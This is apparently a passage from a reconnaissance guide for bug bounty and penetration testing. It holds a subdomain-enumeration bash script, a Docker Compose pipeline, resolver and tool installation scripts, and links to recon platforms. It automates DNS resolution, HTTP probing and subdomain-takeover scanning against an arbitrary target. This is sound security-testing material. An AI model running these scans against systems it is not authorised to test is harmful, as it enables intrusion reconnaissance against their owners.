  echo ""
  echo -e "${GREEN}[PHASE 3] Resolution & Validation${NC}"
  echo "============================================"

  # DNS resolution
  echo -e "${YELLOW}[+] DNS resolution with dnsx...${NC}"
  cat "$OUTPUT/all_subdomains.txt" | dnsx -silent -a -resp \
    -o "$OUTPUT/resolved/dnsx.txt" 2>/dev/null
  echo "    Resolved: $(wc -l < "$OUTPUT/resolved/dnsx.txt" 2>/dev/null || echo 0)"

  # CNAME extraction
  echo -e "${YELLOW}[+] Extracting CNAME records...${NC}"
  cat "$OUTPUT/all_subdomains.txt" | dnsx -silent -cname -resp \
    -o "$OUTPUT/resolved/cnames.txt" 2>/dev/null
  echo "    CNAMEs: $(wc -l < "$OUTPUT/resolved/cnames.txt" 2>/dev/null || echo 0)"

  # HTTP probing
  echo -e "${YELLOW}[+] HTTP probing with httpx...${NC}"
  cat "$OUTPUT/all_subdomains.txt" | httpx -silent \
    -status-code -title -tech-detect -ip -cname \
    -follow-redirects \
    -o "$OUTPUT/resolved/httpx.txt" 2>/dev/null
  echo "    Alive: $(wc -l < "$OUTPUT/resolved/httpx.txt" 2>/dev/null || echo 0)"

  #============================================================
  # PHASE 4: SUBDOMAIN TAKEOVER CHECK
  #============================================================
  echo ""
  echo -e "${GREEN}[PHASE 4] Subdomain Takeover Check${NC}"
  echo "============================================"

  echo -e "${YELLOW}[+] Checking with nuclei takeover templates...${NC}"
  cat "$OUTPUT/all_subdomains.txt" | nuclei \
    -t ~/nuclei-templates/http/takeovers/ \
    -silent -c 50 \
    -o "$OUTPUT/takeover/nuclei.txt" 2>/dev/null

  TAKEOVER_COUNT=$(wc -l < "$OUTPUT/takeover/nuclei.txt" 2>/dev/null || echo 0)
  if [ "$TAKEOVER_COUNT" -gt 0 ]; then
    echo -e "${RED}    [!] TAKEOVER VULNERABILITIES FOUND: $TAKEOVER_COUNT${NC}"
    cat "$OUTPUT/takeover/nuclei.txt"
  else
    echo "    No takeover vulnerabilities detected"
  fi

  #============================================================
  # PHASE 5: SCREENSHOTS
  #============================================================
  echo ""
  echo -e "${GREEN}[PHASE 5] Screenshots${NC}"
  echo "============================================"

  echo -e "${YELLOW}[+] Taking screenshots with gowitness...${NC}"
  cat "$OUTPUT/resolved/httpx.txt" 2>/dev/null | awk '{print $1}' | \
    gowitness scan file -f - --screenshot-path "$OUTPUT/screenshots/" 2>/dev/null

  #============================================================
  # SUMMARY
  #============================================================
  echo ""
  echo -e "${BLUE}=========================================${NC}"
  echo -e "${BLUE}  SUBDOMAIN ENUMERATION COMPLETE${NC}"
  echo -e "${BLUE}=========================================${NC}"
  echo -e "Target:          ${GREEN}$TARGET${NC}"
  echo -e "Passive Found:   $(wc -l < "$OUTPUT/passive_all.txt" 2>/dev/null || echo 0)"
  echo -e "Active Found:    $(cat "$OUTPUT"/active/*.txt 2>/dev/null | sort -u | wc -l || echo 0)"
  echo -e "Total Unique:    $(wc -l < "$OUTPUT/all_subdomains.txt" 2>/dev/null || echo 0)"
  echo -e "DNS Resolved:    $(wc -l < "$OUTPUT/resolved/dnsx.txt" 2>/dev/null || echo 0)"
  echo -e "HTTP Alive:      $(wc -l < "$OUTPUT/resolved/httpx.txt" 2>/dev/null || echo 0)"
  echo -e "CNAME Records:   $(wc -l < "$OUTPUT/resolved/cnames.txt" 2>/dev/null || echo 0)"
  echo -e "Takeover Vulns:  ${RED}$TAKEOVER_COUNT${NC}"
  echo -e "Output Dir:      $OUTPUT/"
  echo -e "${BLUE}=========================================${NC}"
  ```
  ::
  :::

  :::tabs-item{icon="i-lucide-container" label="Docker Compose"}
  ::code-collapse
  ```yaml [docker-compose.yml]
  version: '3.8'

  services:
    subfinder:
      image: projectdiscovery/subfinder:latest
      container_name: recon-subfinder
      volumes:
        - ./results:/results
        - ./config/subfinder:/root/.config/subfinder
      command: ["-d", "${TARGET}", "-all", "-silent", "-o", "/results/subfinder.txt"]
      networks:
        - recon

    amass:
      image: caffix/amass:latest
      container_name: recon-amass
      volumes:
        - ./results:/results
        - ./config/amass:/root/.config/amass
      command: ["enum", "-passive", "-d", "${TARGET}", "-o", "/results/amass.txt"]
      networks:
        - recon

    merge:
      image: alpine:latest
      container_name: recon-merge
      volumes:
        - ./results:/results
      depends_on:
        subfinder:
          condition: service_completed_successfully
        amass:
          condition: service_completed_successfully
      entrypoint: ["/bin/sh", "-c"]
      command:
        - |
          echo "[*] Merging results..."
          cat /results/subfinder.txt /results/amass.txt 2>/dev/null | \
            sort -u > /results/all_subdomains.txt
          echo "[+] Total: $$(wc -l < /results/all_subdomains.txt) subdomains"
      networks:
        - recon

    dnsx:
      image: projectdiscovery/dnsx:latest
      container_name: recon-dnsx
      volumes:
        - ./results:/results
      depends_on:
        merge:
          condition: service_completed_successfully
      entrypoint: ["/bin/sh", "-c"]
      command:
        - |
          cat /results/all_subdomains.txt | \
          dnsx -silent -a -cname -resp -o /results/resolved.txt
      networks:
        - recon

    httpx:
      image: projectdiscovery/httpx:latest
      container_name: recon-httpx
      volumes:
        - ./results:/results
      depends_on:
        dnsx:
          condition: service_completed_successfully
      entrypoint: ["/bin/sh", "-c"]
      command:
        - |
          cat /results/all_subdomains.txt | \
          httpx -silent -status-code -title -tech-detect -ip \
          -o /results/alive.txt
      networks:
        - recon

    nuclei-takeover:
      image: projectdiscovery/nuclei:latest
      container_name: recon-nuclei
      volumes:
        - ./results:/results
      depends_on:
        httpx:
          condition: service_completed_successfully
      entrypoint: ["/bin/sh", "-c"]
      command:
        - |
          nuclei -update-templates 2>/dev/null
          cat /results/alive.txt | awk '{print $$1}' | \
          nuclei -t /root/nuclei-templates/http/takeovers/ \
          -silent -o /results/takeover.txt
      networks:
        - recon

    report:
      image: alpine:latest
      container_name: recon-report
      volumes:
        - ./results:/results
      depends_on:
        nuclei-takeover:
          condition: service_completed_successfully
      entrypoint: ["/bin/sh", "-c"]
      command:
        - |
          echo "========================================="
          echo "  RECON COMPLETE: ${TARGET}"
          echo "========================================="
          echo "Subdomains:  $$(wc -l < /results/all_subdomains.txt 2>/dev/null || echo 0)"
          echo "Resolved:    $$(wc -l < /results/resolved.txt 2>/dev/null || echo 0)"
          echo "Alive:       $$(wc -l < /results/alive.txt 2>/dev/null || echo 0)"
          echo "Takeovers:   $$(wc -l < /results/takeover.txt 2>/dev/null || echo 0)"
          echo "========================================="
      networks:
        - recon

  networks:
    recon:
      driver: bridge
  ```
  ::
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Resolvers Setup"}
  ```bash [setup_resolvers.sh]
  #!/bin/bash
  # Download and validate fresh DNS resolvers

  echo "[*] Downloading public resolvers..."
  curl -s https://raw.githubusercontent.com/trickest/resolvers/main/resolvers.txt \
    -o /tmp/resolvers_raw.txt

  echo "[*] Downloading backup resolvers..."
  curl -s https://raw.githubusercontent.com/janmasarik/resolvers/master/resolvers.txt \
    >> /tmp/resolvers_raw.txt

  sort -u -o /tmp/resolvers_raw.txt /tmp/resolvers_raw.txt

  # Validate with dnsvalidator
  if command -v dnsvalidator &>/dev/null; then
    echo "[*] Validating resolvers..."
    dnsvalidator -tL /tmp/resolvers_raw.txt -threads 100 -o ~/resolvers.txt
  else
    cp /tmp/resolvers_raw.txt ~/resolvers.txt
  fi

  echo "[+] Valid resolvers: $(wc -l < ~/resolvers.txt)"

  # Create trusted resolvers (always works)
  cat > ~/resolvers_trusted.txt << 'EOF'
  8.8.8.8
  8.8.4.4
  1.1.1.1
  1.0.0.1
  9.9.9.9
  149.112.112.112
  208.67.222.222
  208.67.220.220
  64.6.64.6
  64.6.65.6
  74.82.42.42
  156.154.70.1
  156.154.71.1
  198.101.242.72
  176.103.130.130
  176.103.130.131
  EOF
  echo "[+] Trusted resolvers: $(wc -l < ~/resolvers_trusted.txt)"
  ```
  :::
::

---

## Tool Installation (Complete)

::code-collapse
```bash [install_all_tools.sh]
#!/bin/bash
#============================================================
# Install All Subdomain Enumeration Tools
# Tested on: Kali Linux 2024/2025, Ubuntu 22.04+, Debian 12+
#============================================================

echo "============================================"
echo "  INSTALLING SUBDOMAIN ENUMERATION TOOLS"
echo "============================================"

# Ensure Go is installed
if ! command -v go &>/dev/null; then
  echo "[*] Installing Go..."
  wget -q https://go.dev/dl/go1.22.4.linux-amd64.tar.gz
  sudo tar -C /usr/local -xzf go1.22.4.linux-amd64.tar.gz
  echo 'export PATH=$PATH:/usr/local/go/bin:$HOME/go/bin' >> ~/.bashrc
  export PATH=$PATH:/usr/local/go/bin:$HOME/go/bin
fi

echo "[*] Installing Go-based tools..."

# ProjectDiscovery Suite
go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest
go install -v github.com/projectdiscovery/dnsx/cmd/dnsx@latest
go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
go install -v github.com/projectdiscovery/shuffledns/cmd/shuffledns@latest

# DNS brute forcing
go install -v github.com/d3mondev/puredns/v2@latest
go install -v github.com/OJ/gobuster/v3@latest
go install -v github.com/ffuf/ffuf/v2@latest

# Subdomain discovery
go install -v github.com/tomnomnom/assetfinder@latest
go install -v github.com/gwen001/github-subdomains@latest

# Takeover detection
go install -v github.com/haccer/subjack@latest
go install -v github.com/PentestPad/subzy@latest

# URL and domain tools
go install -v github.com/tomnomnom/waybackurls@latest
go install -v github.com/tomnomnom/unfurl@latest
go install -v github.com/tomnomnom/httprobe@latest
go install -v github.com/lc/gau/v2/cmd/gau@latest

# Permutation tools
go install -v github.com/Josue87/gotator@latest

# Screenshots
go install -v github.com/sensepost/gowitness@latest

# Amass
go install -v github.com/owasp-amass/amass/v4/...@master

echo "[*] Installing Python-based tools..."

# Sublist3r
pip3 install sublist3r 2>/dev/null || {
  git clone https://github.com/aboul3la/Sublist3r.git /opt/Sublist3r
  cd /opt/Sublist3r && pip3 install -r requirements.txt
  sudo ln -sf /opt/Sublist3r/sublist3r.py /usr/local/bin/sublist3r
}

# dnsgen
pip3 install dnsgen

# altdns
pip3 install py-altdns

# dnsrecon
pip3 install dnsrecon

# knockpy
pip3 install knockpy

# theHarvester
pip3 install theHarvester

# Subdominator
pip3 install git+https://github.com/RevoltSecurities/Subdominator.git 2>/dev/null

# Shodan CLI
pip3 install shodan

# Censys CLI
pip3 install censys

echo "[*] Installing system tools..."

# massdns
if ! command -v massdns &>/dev/null; then
  git clone https://github.com/blechschmidt/massdns.git /opt/massdns
  cd /opt/massdns && make && sudo cp bin/massdns /usr/local/bin/
fi

# dnsvalidator
if ! command -v dnsvalidator &>/dev/null; then
  git clone https://github.com/vortexau/dnsvalidator.git /opt/dnsvalidator
  cd /opt/dnsvalidator && pip3 install -r requirements.txt && sudo python3 setup.py install
fi

# findomain
if ! command -v findomain &>/dev/null; then
  curl -LO https://github.com/Findomain/Findomain/releases/latest/download/findomain-linux.zip
  unzip -o findomain-linux.zip && chmod +x findomain && sudo mv findomain /usr/local/bin/
  rm -f findomain-linux.zip
fi

# Kali-specific tools (already installed on Kali)
echo "[*] Installing Kali packages..."
sudo apt update -qq
sudo apt install -y -qq \
  fierce \
  dnsenum \
  dnsrecon \
  dnsutils \
  whois \
  nmap \
  gobuster \
  seclists \
  eyewitness \
  2>/dev/null

echo "[*] Downloading wordlists..."
mkdir -p ~/wordlists

# SecLists (if not already installed via apt)
if [ ! -d "/usr/share/seclists" ] && [ ! -d "$HOME/wordlists/SecLists" ]; then
  git clone --depth 1 https://github.com/danielmiessler/SecLists.git ~/wordlists/SecLists
fi

# Assetnote best DNS wordlist
wget -q -O ~/wordlists/best-dns-wordlist.txt \
  https://wordlists-cdn.assetnote.io/data/manual/best-dns-wordlist.txt 2>/dev/null

# Jason Haddix all.txt
wget -q -O ~/wordlists/jhaddix-all.txt \
  https://gist.githubusercontent.com/jhaddix/86a06c5dc309d08580a018c66354a056/raw/ 2>/dev/null

# Setup resolvers
echo "[*] Setting up DNS resolvers..."
curl -s https://raw.githubusercontent.com/trickest/resolvers/main/resolvers.txt \
  -o ~/resolvers.txt

# Update nuclei templates
echo "[*] Updating nuclei templates..."
nuclei -update-templates 2>/dev/null

echo ""
echo "============================================"
echo "  INSTALLATION COMPLETE"
echo "============================================"
echo "Add to PATH: export PATH=\$PATH:\$HOME/go/bin"
echo "============================================"
```
::

---

## Online Recon Platforms

::card-group
  ::card
  ---
  title: crt.sh
  icon: i-lucide-shield-check
  to: https://crt.sh
  target: _blank
  ---
  Free Certificate Transparency log search. Query all SSL certificates ever issued for a domain. No account needed.
  ::

  ::card
  ---
  title: Shodan
  icon: i-lucide-globe
  to: https://www.shodan.io
  target: _blank
  ---
  Internet-connected device search engine. Discover subdomains via SSL certificates, banners, and organizational data.
  ::

  ::card
  ---
  title: Censys
  icon: i-lucide-search
  to: https://search.censys.io
  target: _blank
  ---
  Internet-wide scanning platform. Search certificates and hosts to discover subdomains and infrastructure.
  ::

  ::card
  ---
  title: SecurityTrails
  icon: i-lucide-database
  to: https://securitytrails.com
  target: _blank
  ---
  Historical DNS data and subdomain discovery. Free API tier with 50 queries/month.
  ::

  ::card
  ---
  title: VirusTotal
  icon: i-lucide-scan
  to: https://www.virustotal.com
  target: _blank
  ---
  Malware and URL scanning platform with passive DNS and subdomain discovery capabilities.
  ::

  ::card
  ---
  title: DNSdumpster
  icon: i-lucide-server
  to: https://dnsdumpster.com
  target: _blank
  ---
  Free domain research tool. DNS recon and subdomain enumeration with visual network mapping.
  ::

  ::card
  ---
  title: FOFA
  icon: i-lucide-radar
  to: https://en.fofa.info
  target: _blank
  ---
  Chinese cyberspace search engine. Discovers assets via certificates, HTTP headers, and banners.
  ::

  ::card
  ---
  title: Hunter.how
  icon: i-lucide-crosshair
  to: https://hunter.how
  target: _blank
  ---
  Internet-connected asset search. Discover subdomains through SSL, HTTP response, and banner data.
  ::

  ::card
  ---
  title: AlienVault OTX
  icon: i-lucide-shield
  to: https://otx.alienvault.com
  target: _blank
  ---
  Open Threat Exchange. Free passive DNS and subdomain data. No API key required for basic queries.
  ::

  ::card
  ---
  title: URLScan.io
  icon: i-lucide-link
  to: https://urlscan.io
  target: _blank
  ---
  Website scanning service with subdomain discovery from scanned URLs. Free API available.
  ::

  ::card
  ---
  title: Chaos (ProjectDiscovery)
  icon: i-lucide-database
  to: https://chaos.projectdiscovery.io
  target: _blank
  ---
  3B+ subdomain dataset from internet-wide scanning. Free API key with ProjectDiscovery account.
  ::

  ::card
  ---
  title: Netcraft
  icon: i-lucide-globe
  to: https://searchdns.netcraft.com
  target: _blank
  ---
  DNS search and site report. Discover subdomains through Netcraft's web crawling database.
  ::
::

---

## References & Documentation

::card-group
  ::card
  ---
  title: can-i-take-over-xyz
  icon: i-simple-icons-github
  to: https://github.com/EdOverflow/can-i-take-over-xyz
  target: _blank
  ---
  Comprehensive and community-maintained list of services vulnerable to subdomain takeover with fingerprints, proof of concepts, and current status.
  ::

  ::card
  ---
  title: SecLists DNS Wordlists
  icon: i-simple-icons-github
  to: https://github.com/danielmiessler/SecLists/tree/master/Discovery/DNS
  target: _blank
  ---
  Industry-standard wordlists for DNS brute forcing. Includes top 1M subdomain names, maintained by Daniel Miessler.
  ::

  ::card
  ---
  title: Subfinder (ProjectDiscovery)
  icon: i-simple-icons-github
  to: https://github.com/projectdiscovery/subfinder
  target: _blank
  ---
  Fast passive subdomain enumeration tool. Supports 60+ data sources with concurrent querying.
  ::

  ::card
  ---
  title: Amass (OWASP)
  icon: i-simple-icons-github
  to: https://github.com/owasp-amass/amass
  target: _blank
  ---
  OWASP's in-depth attack surface mapping tool with DNS enumeration, ASN discovery, and network correlation.
  ::

  ::card
  ---
  title: Sublist3r
  icon: i-simple-icons-github
  to: https://github.com/aboul3la/Sublist3r
  target: _blank
  ---
  Python-based subdomain enumeration using search engines (Google, Yahoo, Bing, Baidu) and public APIs.
  ::

  ::card
  ---
  title: Nuclei Takeover Templates
  icon: i-simple-icons-github
  to: https://github.com/projectdiscovery/nuclei-templates/tree/main/http/takeovers
  target: _blank
  ---
  Community-maintained nuclei templates for detecting subdomain takeover vulnerabilities across 70+ services.
  ::

  ::card
  ---
  title: Assetnote Wordlists
  icon: i-lucide-file-text
  to: https://wordlists.assetnote.io
  target: _blank
  ---
  Automatically generated wordlists from real-world HTTP Archive crawl data. Updated monthly.
  ::

  ::card
  ---
  title: HackTricks - Subdomain Enum
  icon: i-lucide-book-open
  to: https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html
  target: _blank
  ---
  Detailed external reconnaissance methodology including subdomain enumeration, takeover, and privilege escalation paths.
  ::

  ::card
  ---
  title: Bug Bounty Hunting Methodology
  icon: i-lucide-target
  to: https://0xpatrik.com/subdomain-takeover/
  target: _blank
  ---
  In-depth blog post on subdomain takeover detection, exploitation, and real-world case studies by 0xPatrik.
  ::

  ::card
  ---
  title: Kali Linux Tools Listing
  icon: i-lucide-terminal
  to: https://www.kali.org/tools/
  target: _blank
  ---
  Official Kali Linux tools documentation. Includes all pre-installed DNS and reconnaissance tools with usage examples.
  ::

  ::card
  ---
  title: PayloadsAllTheThings - Subdomain Takeover
  icon: i-simple-icons-github
  to: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Subdomain%20Takeover
  target: _blank
  ---
  Curated collection of subdomain takeover payloads, fingerprints, and methodology from PayloadsAllTheThings.
  ::

  ::card
  ---
  title: The Art of Subdomain Enumeration
  icon: i-lucide-book-open
  to: https://appsecco.com/books/subdomain-enumeration/
  target: _blank
  ---
  Free online book covering every aspect of subdomain enumeration from passive OSINT to active DNS attacks.
  ::
::